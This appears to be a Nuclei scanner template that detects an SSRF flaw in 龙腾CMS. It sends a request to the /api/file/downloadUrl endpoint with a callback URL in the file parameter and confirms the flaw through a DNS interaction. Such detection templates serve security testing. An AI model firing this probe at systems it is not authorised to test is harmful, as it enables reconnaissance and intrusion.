id: ltcm-downloadurl-ssrf
info:
  name: 龙腾CMS downloadUrl SSRF Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: ssrf,dnslog

variables:
  reverse: "{{interactsh-url}}"

http:
  - raw:
      - |
        GET /api/file/downloadUrl?file=http://{{reverse}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: interactsh_protocol
        words:
          - dns
